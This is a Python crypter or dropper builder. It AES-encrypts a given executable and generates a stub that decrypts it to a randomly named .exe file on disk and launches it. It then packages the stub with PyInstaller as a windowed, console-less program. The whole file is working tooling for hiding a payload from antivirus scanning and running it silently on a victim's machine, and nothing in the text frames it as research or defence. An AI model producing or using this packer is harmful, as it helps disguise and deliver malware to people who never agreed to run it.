import pyaes
import sys
import os
import random
import string

KEY = b" " #Change This to a random 16 char string


def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str + '.exe'


print(KEY)
if len(sys.argv) != 3:
    print("Usage: python [exe_path] [stub_name]")
try:
    exe_path = sys.argv[1]
    stub_name = sys.argv[2]
    dropname = get_random_string(8)

    with open(exe_path, "rb") as file:
        exe = file.read()

    encrypt_data = pyaes.AESModeOfOperationCTR(KEY).encrypt(exe)

    stub = f"""
import pyaes
import subprocess
import subprocess
dropfile = '{dropname}'
key = {KEY}
encrypt_data = {encrypt_data}
decrypt_data = pyaes.AESModeOfOperationCTR(key).decrypt(encrypt_data)
with open(dropfile, "wb") as file:
    file.write(decrypt_data)
    
proc = subprocess.Popen(dropfile)
    """

    with open(stub_name, "w") as file:
        file.write(stub)

    os.system("pyinstaller -F -w --clean {}".format(stub_name))
except:
        pass
